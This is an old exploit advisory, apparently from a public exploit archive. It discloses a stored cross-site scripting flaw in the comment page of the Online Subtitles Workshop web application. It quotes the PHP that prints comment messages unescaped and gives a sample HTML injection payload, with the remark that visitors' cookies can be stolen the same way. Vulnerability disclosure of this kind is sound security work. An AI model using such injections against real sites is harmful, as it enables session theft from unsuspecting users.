@@ -1,0 +1,56 @@
+===================================================================================
+ Online Subtitles Workshop XSS vulnerabilities
+===================================================================================
+# Exploit Title: Online Subtitles Workshop XSS vulnerabilities
+# Author: M.Jock3R (www.the-code.tk)
+# Script Download: http://sourceforge.net/projects/onlinesubtitles/files/
+# Category:: webapps
+# Tested on: windows XP Sp2 FR
+===================================================================================
+
+Vuln file: video_comments.php
+
+Vuln code:
+---------
+$all_comments = read_video_comments($video_id);
+
+//print_r($all_comments);
+
+$video_comments = "";
+
+for ($i = 0; $i <= count($all_comments)-1; $i++) {
+
+    $video_comments = $video_comments . "
+<table style='width:100%'>
+<tr>
+<td style='width:100%'>
+".get_user_name($all_comments[$i]['id'])."
+</td>
+<td>
+
+".date('h:i:s A m-d-Y ', $all_comments[$i]['time'])." 
+</td>
+</tr>
+<tr>
+<td colspan='7'>
+".$all_comments[$i]['message']." <== Here you can inject any HTML or Javascript code :)
+</td>
+</tr>
+</table>
+<br>
+";
+
+Exploit:
+---------
+First,Choose any video.
+Go to comments, and write for example : <marquee><font color=red size=15>M.jock3r</font>/marquee>
+-Or you can steal the cookies of any one browse the video page :)
+
+===================================================================================
+Greets To :
+the C0de team / sa-hacker.com
+
+Email : madrido.jocker@gmail.com
+  
+THANKS TO ALL ALGERIANS HACK3RS
+===================================================================================
